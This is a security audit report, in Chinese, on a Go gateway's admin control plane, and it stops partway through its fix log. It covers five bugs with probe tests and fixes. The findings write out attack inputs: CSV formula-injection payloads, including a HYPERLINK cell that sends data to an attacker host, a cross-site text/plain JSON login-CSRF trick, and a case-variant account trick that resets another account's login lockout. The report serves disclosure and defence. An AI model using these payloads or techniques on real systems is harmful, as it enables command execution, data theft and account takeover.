# Bug 排查 E：controlplane 管理端与权限边界（2026-10-29 bughunt）

> **任务**：task-6（第 3 轮）。只读审计 + 探针测试，**未改任何生产代码、未 commit**。
> **基线**：HEAD `2f43d28`（`go build ./...` / `go vet ./...` / `gofmt -l` 干净，`go test ./...` 全绿）。
> **域**：`internal/controlplane` 全量管理端（channels / keys / users / wallet / redemption / pricing / skills / mcp / announcements / oauth / session / login）+ 权限边界（`internal/api/router.go` 的路由分组、`internal/middleware/authz.go` 的数据面准入）。
> **接手**：上一轮的 C-05（登录 CSRF，原判「SameSite=Lax 已缓解，当前不可利用」）与 C-06（用户名大小写归一化，跨 storage）。
> **不查**：风格、性能；`docs/audit/2026-10-28-bughunt/README.md` §1 的 24 条已修项、§6 遗留项、§2/§3 已排除项（含 B-01…B-05、C-01…C-04），本轮不重复上报。
> **并行**：审计期间另一 teammate 正在做代码删除（`internal/api`、`internal/billing`、`internal/middleware` 有瞬时未构建完的状态），本报告行号以**当前工作区**为准。

---

## 0. 结论摘要

管理端的**架构**是健康的：路由按 `protected`（登录即可）/`adminOnly`（`RequireAdminRole`）两级分组，共用 handler 普遍自判角色或自行做 owner 收窄（`ListAPIKeys` / `ListLogs` / `GetStatsOverview` / `GetStatsTimeSeries` / `ListRequestTraces` / `ListMCPServers` 逐个复核，见 §4），钱包、兑换码、充值订单的并发路径全部是**原子状态迁移**（`RedeemCode` 的 `UPDATE ... WHERE status='active'`、`CompleteRechargeOrder` 的 `WHERE status <> 'paid'`、`UpdateUserBalance` 的 `balance_units` 区间原子加），OAuth 回调的 state 绑定/OAuth login-CSRF/provider 混淆/production 拒绝模拟登录也都成立。

本轮仍找到 **2 条 P1 + 3 条 P2**，全部有可执行探针（`internal/controlplane/admin_permission_bugprobe_test.go`，5 个用例，断言**当前错误行为**，套件保持绿）：

| ID | 级别 | 置信度 | 一句话 | 位置 |
|---|---|---|---|---|
| **BUG-CP-01** | **P1** | 高 | 自助租户可把**管理员停用的** API key 一行 PATCH 改回 `active`：更新的 status 无角色 clamp，而**创建**路径明确写了「非管理员不能自升状态」；数据面只认 `status=="active"`，于是吊销立刻失效 | `internal/controlplane/key_update.go:102-104`（对比 `key_creation.go:157-160`） |
| **BUG-CP-02** | **P1** | 高 | **C-06 升级**：用户名唯一性是**大小写敏感**，登录锁桶却按**小写**归一。攻击者注册受害者的「仅大小写不同」账号并正常登录，即可把受害账号的失败计数清零 ⇒ 5 次/账号的锁定失效；无受信代理的直连部署里**定向爆破无上限**（实测 16 次全放行） | `internal/controlplane/login_guard.go:262-268,291-293,368-378` + `internal/storage/repo_users.go:47-48` + `identity_handler.go:116-119` |
| **BUG-CP-03** | P2 | 高 | 批量状态接口把**非法 status 静默改成 `active`**（`disable`／`off`／`Disabled`／空串全变「启用」）⇒ 运维想批量停用被吊销的 key/channel，实际把它们**启用**了（fail-open） | `internal/controlplane/admin_handler.go:221-231`、`channel_service.go:241-246` |
| **BUG-CP-04** | P2 | 高 | 供应商成本 **CSV 导出未中和公式注入**（`=cmd\|...`、`=HYPERLINK(...)`），而这正是控制台下载导出的那个文件；前端同仓的 `csvEscape` 已明确中和同类负载 ⇒ 同一件事两套实现，被用户打开的那条没防护 | `internal/controlplane/admin_cost.go:101-123` vs `web/src/config.js:54-66`、`web/src/components/SupplierCostPanel.jsx:110-119` |
| **BUG-CP-05** | P2 | 中高 | **C-05 复核结论：不是「不可利用」**。登录端点无 CSRF token / Origin / Referer 校验，且 `ShouldBindJSON` 对任意 Content-Type 都解析 JSON ⇒ 跨站 `text/plain` 表单可直投 JSON 登录，`SameSite=Lax` **不阻止**响应里的 `Set-Cookie`（Lax 管的是「发不发 cookie」，不是「收不收 Set-Cookie」）⇒ 登录 CSRF（会话置换）成立；同类还有未鉴权的 `POST /api/v1/auth/logout`（强制登出） | `internal/api/router.go:153,161`、`internal/controlplane/account_handler.go:66-136,232-235`、`session.go:47-70` |

> 阈值说明：本轮的 P1 都过了「能不能绕过/防御是否真的生效」这条线；P2 是「不会直接错账或越权，但安全承诺与实际不符，或有明确的功能/运维误伤」。**没有 P0**。

---

## 1. 发现详情

### BUG-CP-01（P1，高）自助租户可以把管理员停用的 API key 改回启用

**位置**
- `internal/controlplane/key_update.go:102-104` — `if req.Status != nil { existing.Status = *req.Status }`，**无任何角色判定**
- `internal/controlplane/key_creation.go:157-160` — 创建路径的对照：`// A non-administrator cannot self-elevate the key's state.` `if !callerIsAdmin { rec.Status = "active" }`
- `internal/controlplane/key_access.go:69-71,81-84` — 所有者通过 `CheckOwnership`（非管理员的唯一门槛就是 owner）
- `internal/api/router.go:205` — `protected.PUT("/keys/:id", ...)`：**在共用组里**（只有 `AdminAuthMiddleware`，没有 `RequireAdminRole`），普通用户可达
- `internal/middleware/authz.go:55-65` — 数据面准入：`if status == "" || status == "active" { return nil }`，其余一律 401 `api_key_revoked`

**触发条件**：管理员通过 `PUT /api/v1/admin/keys/:id` 或 `POST /api/v1/admin/keys/batch-status` 把某租户的 key 置 `disabled`（吊销泄漏的凭据／止付）；该租户随后用自己的会话发
`PUT /api/v1/admin/keys/<自己的 id>` + `{"status":"active"}`。

**根因**：`Status` 被视为「普通可更新字段」，但它是**授权状态**。创建路径把「非管理员不得指定状态」写进了规则并写了注释，更新路径漏了同一规则——典型的「同一规则两处实现，只落了一处」（本仓 `user_key_rules.go:41-46` 对 RPM 的 clamp 也踩过同一个坑并修过）。

**影响**
1. **管理员吊销不可持久**：唯一持久的手段只剩 `DELETE`（硬删）或锁账号；`disabled` 变成「建议值」。
2. 被吊销的**泄漏凭据**可由持有者（或已窃取该 key 的攻击者）随时复活，`syncDataPlane` 后数据面立即放行，无冷却期的吊销窗口也不存在。
3. 反向也成立：租户可把自己的 key 设成任意字符串（如 `"Disable"`），数据面按 401 处理，行为与探针语义一致但**状态机没有枚举校验**。

**证据（探针）**
```
export PATH=$PATH:/usr/local/go/bin
go test ./internal/controlplane/ -run TestBugCP01 -v
→ BUG-CP-01 confirmed: a non-admin owner turned an administrator-revoked key back to "active";
  the data plane admits it again (middleware.KeyStatusDenial==nil). Creation forbids self-elevation, update does not.
```
（探针走真实 handler：内存 SQLite + 真实 `repo.CreateAPIKey(user_id=owner, status="disabled")` + `c.Set("admin_claims", Role:"user")`，断言 200 且回读 `status=="active"`。）

**修复方向**：`ApplyKeyUpdate` 增加 `if !access.IsAdmin { /* 只允许 active↔disabled 的自助语义，且 disabled→active 必须被拒 */ }`；或把 `status` 从非管理员的更新白名单里移除（自服务只需「停用自己的 key」，可另开一个专用端点）。同时给 `status` 加枚举校验（`active|disabled`）。

---

### BUG-CP-02（P1，高）大小写变体账号可清零受害账号的登录锁桶（C-06 的实际影响）

**位置**
- `internal/controlplane/login_guard.go:262-268` — `accountBuckets` 的 subject = `normalizeLoginSubject(client.Username)`
- `internal/controlplane/login_guard.go:291-293` — `normalizeLoginSubject` = `strings.ToLower(strings.TrimSpace(username))`
- `internal/controlplane/login_guard.go:368-378` — `success()` 用 `accountBuckets(client)` 清桶（**只**清账号维度，这是上一轮 B-02 的正确修复）
- `internal/storage/repo_users.go:47-48` — `GetUserByUsername` 是 `WHERE username = ?`（**大小写敏感**）
- `internal/storage/migrations_sqlite.go:119-130` / `migrations_postgres.go:68-78` — `username TEXT/VARCHAR UNIQUE`（默认 BINARY 排序规则，**大小写敏感**）
- `internal/controlplane/identity_handler.go:116-119` — 注册只查**精确**重名
- 对照：邮箱唯一性是**大小写不敏感**的（`users_email_unique` 迁移 + `LOWER(email)` 部分唯一索引，`repo_users.go:154-167`）——两者口径不一致正是缺陷根源

**触发条件**：注册开放（默认 `true`，`config_policies.go:34-42`）；攻击者知道受害者的用户名（用户名不是秘密，日志/公开渠道常见）；受害者用户名与另一账号仅大小写不同（由攻击者注册出来）。

**根因**：**授权状态（用户名）用 case-sensitive 比较，而防爆破计数器用 case-insensitive 归一**。`success()` 的语义是「这次认证证明了这个 subject 的密码」，但 subject 被小写化后，证明「VICTIM 的密码」被当成「victim 的密码」。

**影响**
1. **账号级锁定被无限重置**：攻击者对 `victim` 连续猜 4 次（bucket=4），然后用自己注册的 `VICTIM` 正常登录一次 ⇒ bucket 归零 ⇒ 永不触发 5 次锁定。探针实测 4 轮 × 4 次 = **16 次错误密码全部放行**。
2. 在**没有配置 `GATEWAY_TRUSTED_PROXIES` 的直连部署**里，`ipBuckets` 返回 `nil`（`login_guard.go:274-283`：地址不可归因时不建 IP 桶，否则一个攻击者可锁死整栋楼），账号桶是**唯一**的爆破防线 ⇒ 该场景下即为**无上限定向爆破**。配置了受信代理时仍受 20 次/15 分钟/IP 约束（速率回落到普通喷洒量级，约 4× 提速）。
3. 衍生噪声：对 `VICTIM` 的失败尝试也会锁住真正的 `victim`（跨账号锁桶），攻击者可用它做**低成本定向锁号**。

**证据（探针，含对照组）**
```
go test ./internal/controlplane/ -run TestBugCP02 -v
→ BUG-CP-02 premise 1: accounts "victim" and "VICTIM" coexist (username uniqueness is case-sensitive)
→ BUG-CP-02 confirmed: 16 wrong passwords against "victim" were all admitted because a login to the
  attacker's own "VICTIM" account reset the shared, lower-cased account bucket each cycle
  (limit is 5); in a directly exposed deployment that is unlimited targeted spraying
```
（对照组：同样 5 次失败在没有「诱饵登录」时正常锁定，证明不是探针假设坏了。）

**修复方向**（择一，建议 1+2）
1. 用户名唯一性改成大小写不敏感（`UNIQUE(LOWER(username))` + 查找用 `LOWER(username)=LOWER(?)`），注册时按归一化名判重——这会同时消灭「仿冒 `Admin`」的钓鱼面，但属**跨 storage 契约变更**（需迁移 + 存量重名清理）。
2. 锁桶的 subject 用**账号主键 ID**（`claims`/`user.ID`）而不是输入的用户名：用户名只是别名，证明密码的是账号。这样即使存在大小写变体账号，也不会共享桶。（`loginClient` 在解析到用户后可携带 UserID。）
3. 至少在 `success()` 里要求「本次登录解析出的账号 ID」与「失败计数所属账号 ID」一致。

---

### BUG-CP-03（P2，高）批量状态接口把非法 status 静默改成 `active`

**位置**
- `internal/controlplane/admin_handler.go:221-231` — `bindBatchStatus`：`if req.Status != "active" && req.Status != "disabled" { req.Status = "active" }`
- `internal/controlplane/channel_service.go:241-246` — `normalizeChannelStatus`：`if status == "disabled" { return "disabled" }; return "active"`（同样吞掉非法值）
- 消费方：`admin_keys_batch.go:44-60`（keys）、`admin_channels.go:217-236`（channels），两者都用**入参**决定文案：`action := "启用"; if req.Status == "disabled" { action = "停用" }`

**触发条件**：任何批量停用操作里 status 拼错或语义不同：`{"ids":[...],"status":"disable"}`／`"off"`／`"Disabled"`／`"false"`／`""`。

**根因**：把「无法识别的输入」当成「默认值」而不是**错误**。这与本仓其它地方刻意做的 fail-closed（`FormatValidation` 非法即 400、`ValidateOffPeakSlots` 非法即拒、`UpdateUserStatus` 非法即 400）直接矛盾。

**影响**
1. **安全操作反向执行**：运维批量停用一批泄漏的 key/channel，实际把（已停用的）它们**启用**了；响应文案还写着「已批量启用 N 个」——需要运维自己读懂才不至于误判成成功停用。
2. 幂等性陷阱：「停用」按钮在 status 拼写漂移时会静默变成「启用」，且无审计留痕区分意图与结果。

**证据**
```
go test ./internal/controlplane/ -run TestBugCP03 -v
→ BUG-CP-03 confirmed: POST /keys/batch-status with status="disable" resolved to "active" (fail-open: an intended disable enables the keys)
→ BUG-CP-03 confirmed: normalizeChannelStatus("disable")="active"（"off"/"Disabled"/"" 同）
```

**修复方向**：`bindBatchStatus` 对未知 status 返回 400（与 `UpdateUserStatus` 一致）；`normalizeChannelStatus` 改为 `(string, error)` 或在调用侧先校验 `active|disabled`。

---

### BUG-CP-04（P2，高）供应商成本 CSV 导出未中和电子表格公式注入

**位置**
- `internal/controlplane/admin_cost.go:101-123` — `ExportSupplierCosts` 用 `csv.Writer` 直写 `rec.Channel` / `rec.Model` / `rec.Status`（`encoding/csv` 只处理引号/逗号/换行，**不处理公式前缀**）
- `internal/controlplane/admin_cost.go:125-220` — `ImportSupplierCosts`：这是**设计上**接受「供应商/运维提供的 CSV」的入口
- `internal/storage/repo_supplier_costs.go:23-48` — `normalizeSupplierCost` 只做 `TrimSpace` 与非空/非负校验，**允许** `=`、`+`、`-`、`@`、TAB、CR 开头
- `web/src/components/SupplierCostPanel.jsx:110-119` — 控制台「导出」= `adminFetch('/api/v1/admin/supplier-costs/export')` → `link.download = 'supplier-costs.csv'`（**下载的就是后端这份**）
- `web/src/config.js:54-66` — 前端 `csvEscape` 注释明确：「neutralises spreadsheet formula injection for cells starting with =, +, -, @, tab or carriage return」，但**只作用于前端自己生成的 CSV**（日志导出），不经过这个下载

**触发条件**：运营把供应商给的报价 CSV 通过 `POST /supplier-costs/import` 导入（`channel` 列含 `=cmd|' /C calc'!A0` 或 `=HYPERLINK("http://atk/?"&A1,"x")`），随后点「导出」并用 Excel/LibreOffice 打开下载的 `supplier-costs.csv`。

**根因**：同一个导出能力有两套实现，前端实现做了公式中和，后端实现没有；而被下载的恰好是后端那条。CSV/Excel 的公式注入属于「文件下载类」注入，输入经**导入**路径进入不可信数据，最终在**打开文件**时执行（DDE / 外带数据）。

**影响**：管理员工作站的命令执行面（Excel DDE 需用户确认，LibreOffice 更宽松）或数据外带（`HYPERLINK`/`WEBSERVICE` 把同表其它行内容发到攻击者域名）。仅管理员可达、且需运营执行一次「导入→导出→用表格软件打开」，故 P2 而非 P1。

**证据**
```
go test ./internal/controlplane/ -run TestBugCP04 -v
→ BUG-CP-04 confirmed: exported CSV keeps a formula cell verbatim; opening the download in
  Excel/LibreOffice evaluates it.
  body="\ufeffchannel,model,input_cost,output_cost,status\n=cmd|' /C calc'!A0,m-formula,1.0000,2.0000,active\n"
```

**修复方向**：导出侧对每个单元格做与前端 `csvEscape` 同构的中和（`^[=+\-@\t\r]` 前缀 `'`），或抽一个共享的 `sanitizeCSVCell` 并让前后端用例对齐（`internal/controlplane/admin_cost.go` 只有一个导出点，改动很小）。可选：在 `normalizeSupplierCost` 里拒绝控制字符。

---

### BUG-CP-05（P2，中高）C-05 复核：登录 CSRF 仍然成立，`SameSite=Lax` 不是缓解

**位置**
- `internal/api/router.go:153` — `authGroup.POST("/login", adminHandler.Login)`（免鉴权组）
- `internal/api/router.go:161` — `authGroup.POST("/logout", adminHandler.Logout)`（同样免鉴权、无 CSRF）
- `internal/controlplane/account_handler.go:66-136` — `Login`：只 `ShouldBindJSON`，**没有** CSRF token / `Origin` / `Referer` / `Sec-Fetch-Site` 校验
- `internal/controlplane/account_handler.go:111` → `session.go:47-70` — 成功即 `SetSessionCookies`（HttpOnly、SameSite=Lax）
- `internal/controlplane/account_handler.go:232-235` — `Logout`：无鉴权、无 CSRF，直接清 cookie
- 全仓 grep：`internal/controlplane`/`internal/middleware` 内**没有**任何 `Origin`/`Referer`/`Sec-Fetch` 读取（`auth.go:69` 只是注释里提到 Referer 泄漏）

**机制（为什么 `SameSite=Lax` 不缓解）**
1. 浏览器跨站**顶层表单 POST** 只会带 `application/x-www-form-urlencoded` / `multipart/form-data` / `text/plain`——三者都是 CORS-safelisted，**不触发预检**；Gin 的 `ShouldBindJSON` 与 Content-Type 无关地按 JSON 解析，因此 `text/plain` 表单体可以被构造成合法 JSON（经典技巧：`name` 放 `{"username":"atk","password":"p","x":"`，`value` 放 `"}`）。
2. `SameSite=Lax` 限制的是「跨站请求**携带** cookie」；攻击**不需要**受害者携带任何 cookie（用的是攻击者自己的凭据）。而响应里的 `Set-Cookie` 由浏览器在**顶层导航落点**（网关 origin）处理，Lax 不阻止写入。
3. 于是受害者在不知情的情况下被登录进攻击者账号（会话置换）：其后的充值（Stripe Checkout）、创建的 API key、上传的凭据都落在攻击者账户里。
4. `POST /api/v1/auth/logout` 同理且无鉴权：跨站表单可强制登出（低危骚扰，但同一个修复点）。

**证据（探针）**
```
go test ./internal/controlplane/ -run TestBugCP05 -v
→ BUG-CP-05 confirmed: POST /api/v1/auth/login honoured a text/plain body with
  Origin: https://evil.example, returned 200 and set the airoute_session session cookie
  - no CSRF token, Origin or Referer check protects the login
```
（探针证明的是**可达性前提**：跨站表单可用的 Content-Type 被接受、伪造 Origin 被忽略、会话 cookie 照发。浏览器侧的最终利用需人工按上面 1–3 步复现，故置信度标「中高」而非「高」。）

**与上一轮的差异**：上一轮 §2 的结论是「`SameSite=Lax` 已缓解，当前不可利用」。本轮认为该结论**不成立**：Lax 不能阻止跨站 form POST 的 `Set-Cookie`，且登录端点连 Origin 校验都没有。建议把条目从「记录备查」升级为待修。

**修复方向**（任选其一即可挡住）：登录 POST 校验 `Origin`/`Referer` 与配置的公开域名一致（不匹配 403）；或登录也纳入 double-submit CSRF（会话建立前的 CSRF token 可用一个预置随机 cookie）；或要求 `Content-Type: application/json`（挡住 `text/plain` 表单技巧，成本最低但非完整方案）。`logout` 同样加 Origin 校验。

---

## 2. 接手项结论

| 项 | 上一轮结论 | 本轮结论 | 依据 |
|---|---|---|---|
| **C-05 登录 CSRF** | `SameSite=Lax` 已缓解，当前不可利用；未加 token | **改为「可利用（会话置换）」，P2 中高**；升格为 BUG-CP-05 | 登录无 Origin/Referer/CSRF；`ShouldBindJSON` 接受 `text/plain`；Lax 只管带 cookie、不管 Set-Cookie。探针 + 浏览器复现步骤见 §1 |
| **C-06 用户名大小写归一化** | 跨 storage 语义存疑，未验证；低置信 | **确认成立并升级为 P1**（BUG-CP-02）：`username` 唯一性与查找都是大小写敏感（SQLite/Postgres 均 BINARY 默认），邮箱却是大小写不敏感；`success()` 用小写 subject 清桶 ⇒ 大小写变体账号可清零受害者锁桶 ⇒ 账号级锁定失效。直连部署下定向爆破无上限 | 探针含两份证据：① 两个仅大小写不同的账号可同时创建；② `accountBuckets("VICTIM")` 与 `accountBuckets("victim")` 是同一个桶，且诱饵登录后 16 次失败全放行 |

---

## 3. 探针清单与运行方式

新增单文件：`internal/controlplane/admin_permission_bugprobe_test.go`（`package controlplane`，无外部依赖，内存 SQLite）。

| 用例 | 对应 | 复现命令（`export PATH=$PATH:/usr/local/go/bin`） |
|---|---|---|
| `TestBugCP01_OwnerCanReenableAdminDisabledKey` | BUG-CP-01 | `go test ./internal/controlplane/ -run TestBugCP01 -v` |
| `TestBugCP02_CaseVariantAccountResetsVictimLockoutBucket` | BUG-CP-02（含对照组） | `go test ./internal/controlplane/ -run TestBugCP02 -v` |
| `TestBugCP03_InvalidBatchStatusSilentlyEnables` | BUG-CP-03 | `go test ./internal/controlplane/ -run TestBugCP03 -v` |
| `TestBugCP04_SupplierCostCSVExportLeavesFormulaInjection` | BUG-CP-04 | `go test ./internal/controlplane/ -run TestBugCP04 -v` |
| `TestBugCP05_LoginAcceptsCrossSiteFormBody` | BUG-CP-05 / C-05 | `go test ./internal/controlplane/ -run TestBugCP05 -v` |

**约定**：每个探针**断言当前缺陷行为**，失败信息以 `BUG-CPn appears fixed` 开头，提示修复者删除探针与本报告条目（与上一轮 `02-core.md §4` 的约定一致）。全部探针在 `go test ./...` 下为绿。

---

## 4. 已排除（查了但没有 —— 避免后人重复劳动）

以下都是**逐条读过实现**后判定「不是缺陷」或「不构成本轮 P 级」的结论：

- **租户隔离：key / 日志 / 钱包 / 统计 / 追踪** —— 逐个复核**通过**：
  - `ListAPIKeys`（`admin_keys.go:13-58`）非管理员走 `ListAPIKeysByUser`，`scope=all` 仅 admin；
  - `ListLogs`（`admin_logs.go:14-125`）非管理员设 `ScopeByAPIKeys` + 自有 key 摘要，且 **fail-closed**（`repo_logs.go:326-328`：`ScopeByAPIKeys && len(APIKeys)==0` 直接返回空页）；`key=`/`key_id=` 双条件下推为 SQL `AND api_key IN (...)`，他人 key 只能得到 0 行；`reveal_key=true` 仅 admin（`admin_logs.go:196-201`）；
  - `GetStatsOverview` / `GetStatsTimeSeries`（`admin_overview.go`）非管理员按自有 key 收窄，`key_id` 按**解析出的行**判 owner，无 key 时 `GetStatsOverviewForKeys([])` 返回空结构而非全量（`repository.go:198-201`），`GetStatsTimeSeries` 还额外显式返回空序列（`admin_overview.go:156-161`）；
  - `ListRequestTraces`（`admin_traces.go:13-58`）同样 owner 收窄（该路由本身是 adminOnly，属纵深防御）；
  - `GetUserWallet` / `GetUserRechargeOrder` / `RedeemWalletCode` 全部只用 `claims.Username`，`order_no` 逐个比对 owner（`payment_handler.go:298-314`）。
- **钱包/兑换/充值的并发与状态机** —— 未发现双花或丢失更新：`RedeemCode`（`repo_wallet.go:91-160`）先 `UPDATE redemption_codes SET status='used' WHERE id=? AND status='active'` 再入账、同事务、`RowsAffected==0` 即拒；`CompleteRechargeOrder`（`repo_wallet.go:217-267`）`WHERE status <> 'paid'` 原子迁移且已 paid 提前返回（webhook 重试幂等）；`UpdateUserBalance(delta)` 用 `balance_units` 区间原子加并同语句回写 `balance` 镜像（`repo_users.go:245-285`），`SetUserBalance` 在 Postgres 上 `FOR UPDATE`；Stripe webhook 校验 HMAC + 5 分钟时间窗 + 会话/金额/币种一致（`payment_webhook.go`）。
- **删除/锁定是否真正切断数据面** —— 成立：`DeleteAPIKey` 硬删行 + 数据面快照 miss 时回表（`middleware/auth.go:396-419`），删后旧 key 立即 401；`DeleteUser` 在**同一事务**里把该用户的 keys 置 `deleted`（`repo_users.go:362-382`）；`AdminAuthMiddleware` 每请求复查 `deleted/locked` + `CredentialTag`（绑定密码哈希）⇒ 改密/改角色/删除立即失效（`auth.go:89-114`）。
- **OAuth 回调** —— 未发现缺陷：`state` 是 HMAC 签名 + provider 绑定 + 10 分钟 TTL（`oauth_state.go:88-118`）**加上** HttpOnly cookie 双重提交（`:132-142`），OAuth login-CSRF 已被堵；`simulated` 分支必须 test 二进制或 `ENABLE_SIMULATED_OAUTH=true`，且**不能接管任何已存在账号**（含邮箱匹配，`oauth_handler.go:300-330`）；新账号用户名冲突会追加随机后缀而不是失败（`:167-196`）；回调重定向只去配置的公开域名，不用请求头（`:118-160`）。code 重放由 provider 侧一次性 + state cookie 绑定共同挡住。
- **`id` 路径参数解析** —— 未发现可利用项：`UpdateAPIKey`/`DeleteAPIKey`（`ParseInt` + 404）、`DeleteRedemption`/`DeleteSupplierCost`（`id <= 0` 显式拒）、`statsKeyIDFilter`（`id <= 0` → 400）、`parseChannelID`（负数只会在 store 里查不到 → 404，不构成越权）；`/logs?key_id=` 同样拒非正数。
- **分页 / limit / offset 边界** —— 已收敛：`ListLogs` 先 clamp 到 `MaxUsageLogPageSize` 再回显（`admin_logs.go:15-34`），storage 侧再 clamp 一次（`repo_logs.go:311-321`）；`GetSystemLogs` clamp 到 1000；`ListRequestTraces` 在 storage 侧 clamp `limit<=0||>200 → 50`（`repo_traces.go:61-63`）；`ImportSupplierCosts` 有 5000 行上限 + 2MB 读限。
- **用户管理端的自我锁死保护** —— 完整：`UpdateUserRole`/`UpdateUserStatus`/`DeleteUser` 都拒绝动内置 admin，且禁止降级/删除/锁定自己；`ResetUserPassword` 对「本人」要求旧密码（防会话劫持后改密），对内置 admin 只允许本人操作。
- **`CreateUser` / `Register` 的初始 key 归属** —— 曾疑 `UserID: user.ID` 在插入前为 0；实读 `CreateOAuthUserWithAPIKey`（`repo_users.go:186-209`）在 insert 后回填 `key.UserID = user.ID`，**不是缺陷**。
- **`syncDataPlane` 吞错误**（`admin_handler.go:118-126` 忽略 `ReloadAndBroadcast` 的 error）—— 记录但不升级：数据面每次请求仍会回表校验 key 状态/预算（`auth.go:455-470`），热点路径不会因 reload 失败而放行已吊销的 key；影响只是快照类指标滞后。

---

## 5. 与上一轮/本轮其它报告的关系

- **不重复**：上一轮 24 条已修项（BUG-DATA-01…05、B-01…05、C-01…C-04、BUG-GEMINI-*、BUG-SSE-*、BUG-REQ-MUTATION、BUG-WEB-01…07、DEPLOY-01）与本轮其它 teammate 的 LEAD-01（`ParseMessageContent` 计费）均未重报。
- **C-05 / C-06 是明确接手的遗留项**，本轮给出可证伪的结论（§2）：C-05 从「不可利用」修正为「可利用」，C-06 从「低置信存疑」升级为 P1 且给出机制与探针。
- **跨域交叉印证**：
  - BUG-CP-01 属「同一规则两处实现，只落一处」——与上一轮 `user_key_rules.go:41-46` 修掉的「创建 clamp 了、更新没 clamp」是**完全同构**的第二次发生（那次是 RPM/TPM，这次是 status）。
  - BUG-CP-02 是上一轮 B-02（`success()` 不该清 IP 桶）在**账号维度**上的镜像：`success()` 清「它以为的账号」，而账号身份被小写化合并了。
  - BUG-CP-04 属「两套实现，一套有防护」——与 `docs/audit/2026-10-27-review/06-web.md` 记录的「CSV injection is handled by csvEscape」并不冲突：那句话只覆盖前端生成的 CSV，后端下载这条路径本轮才被证实没有防护（**不是重复上报**）。
- **遗留（本轮未做）**：`syncDataPlane` 吞 reload 错误、`/api/v1/admin/supplier-costs/*` 等 adminOnly handler 未做 handler 内二次 `RequireAdminClaims`（纵深防御，非漏洞）、`ImportSupplierCosts` 逐行 upsert 非原子（中途 DB 故障会部分导入并返回 500）——均为 P3 级别，未计入本轮 P 级。

---

## 6. 修复记录（2026-10-29 修复阶段）

> **范围**：`internal/controlplane/`、`internal/storage/`（仅 `repo_users.go`、`repo_keys.go`、`migrations_sqlite.go`、`migrations_postgres.go`）。未改 `internal/api/router.go`（不需要：CP-01/03/05 都能在 handler/规则层收口），未改 `web/`，未 commit。
> **探针命运**：`admin_permission_bugprobe_test.go` 已删除，翻转为 `admin_permission_hardening_test.go`（断言**正确行为**）；原来 5 条探针的「BUG-CPn appears fixed」提示已全部触发并按约定清理。

### 6.1 逐条结果

| 编号 | 状态 | 关键实现（文件:行） | 回归测试 |
|---|---|---|---|
| **CP-01** | 已修 | 迁移 **v45** 加 `api_keys.admin_disabled`（`migrations_sqlite.go` `addAPIKeyAdminDisabledColumn`）；`APIKeyRecord.AdminDisabled` + 全部 6 处 api_keys SQL 读写该列（`repo_keys.go`）；`ApplyKeyUpdate` 分支：admin 改 status 时写/清标记、非 admin 置 active 且 `admin_disabled=true` → `KeyUpdateAdminRevoked` → 403（`key_update.go:104-128`、`admin_keys.go:writeKeyUpdateDenial`）；创建路径 `PlanCreate` 非 admin 强制 `AdminDisabled=false`、admin 创建 disabled 键置 true（`key_creation.go`）；批量：`BatchUpdateAPIKeyStatus` 自助启用 SQL 层跳过 `admin_disabled` 行、新增 `BatchUpdateAPIKeyStatusAsAdmin`（`repo_keys.go`、`admin_keys_batch.go`）；view 暴露 `admin_disabled`（`key_view.go`） | `TestKeyAdminRevocationCannotBeUndoneByOwner`、`TestKeyAdminRevocationSurvivesBatchStatus`、`TestKeyCreationRecordsAdminDisabledAndExposesIt` |
| **CP-02 / C-06** | 已修 | 迁移 **v44** 建 `uq_users_username_lower`（`ON users (LOWER(username))`，双方言）；`GetUserByUsername` 改 `WHERE LOWER(username)=LOWER(?) ORDER BY id LIMIT 1`（`repo_users.go`）；`insertUser` 增加 lower 重复预检 + `ErrUsernameAlreadyRegistered`，并按唯一索引名分类驱动错误（`isUsernameConflictError`）；注册/建号映射为 409/400（`identity_handler.go`、`user_admin_handler.go`） | `TestUsernameIdentityIsCaseInsensitive`（库层拒绝变体 + 大小写不敏感查找 + 索引存在性 + 注册 400 + 桶一致） |
| **CP-03** | 已修 | `bindBatchStatus` 非法值 → **400**（不再回落 active，`admin_handler.go:220-240`）；单条更新 `ApplyKeyUpdate` 校验 `active|disabled` → `KeyUpdateInvalidValue`(400)（`key_update.go:104-108`）；渠道 `normalizeChannelStatus` 未知值返回 `""` 并由 `BatchStatus`/`mergeChannelUpdate`/`validateNewChannel` 报 `ValidationError`（`channel_service.go`） | `TestBatchStatusRejectsInvalidStatus`；改写 `TestBatchChannelHTTPContract`、`TestChannelServiceBatchStatus*`、`TestBatchBindingAndAuth` |
| **CP-04** | 已修 | 新增 `sanitizeCSVCell`（`^[=+\-@\t\r]`，含前导空格/制表符 → 前缀 `'`），导出对 `channel`/`model`/`status` 应用（`admin_cost.go`），与 `web/src/config.js csvEscape` 同口径 | `TestSupplierCostCSVExportNeutralisesFormulas`（6 类负载 + 良性值不被改动 + 数值列保持机器可读 + 助手用例表） |
| **CP-05 / C-05** | 已修 | 新增 `csrf_origin.go`：`requireJSONBody`（非 `application/json` → **415**）、`requireSameOrigin`（`Origin`，缺失时回退 `Referer`；允许「配置的 PUBLIC_URL」或请求 Host；`Origin: null` 一律拒 → **403**）；接入 `Login`、`Register`、`Logout`（logout 只做 Origin 校验，无 body 要求） | `TestAuthEndpointsRejectCrossSiteRequests`（text/plain、跨站 Origin、跨站 Referer、`Origin: null`、同源含参数、无 Origin 的 CLI、register、logout） |

### 6.2 迁移 v44 / v45 与升级注意（上线前必读）

1. **v44 `users_username_lower_unique`**：`CREATE UNIQUE INDEX IF NOT EXISTS uq_users_username_lower ON users (LOWER(username))`。
   - **存量部署若已存在仅大小写不同的账号**：迁移**不会**自行删除/合并任何行。它先查 `GROUP BY LOWER(username) HAVING COUNT(*)>1`，把冲突组原样列进日志，并以 `errMigrationDeferred` 结束（**网关照常启动、不记录版本、每次重启重试**，与 v27 邮箱索引同一策略）。运维需按日志里的名字（形如 `Alice / alice`）保留一个、改名或删除其余账号，然后重启。
   - 已知边界：SQLite 的 `LOWER()` 只处理 ASCII，非 ASCII 大小写变体不会被该索引拦截；登录锁桶用的是 Go 的 `strings.ToLower`（全 Unicode）。若部署存在非 ASCII 用户名，建议额外加业务层校验。
   - 行 `deleted` 状态的账号仍占名（与既有「删除后用户名保留」语义一致）。
2. **v45 `api_keys_admin_disabled`**：`ADD COLUMN admin_disabled BOOLEAN NOT NULL DEFAULT FALSE`（SQLite：`INTEGER NOT NULL DEFAULT 0`）。默认 `false` ⇒ **存量被停用的 key 仍视为「用户自愿停用」**，可自助重新启用；若历史上有「运维手工停用」的 key，升级后需由管理员在控制台再停用一次以打上标记（否则租户仍可自行启用）。这是有意的：无法从旧数据推断「谁停用的」。
3. **行为变化**：
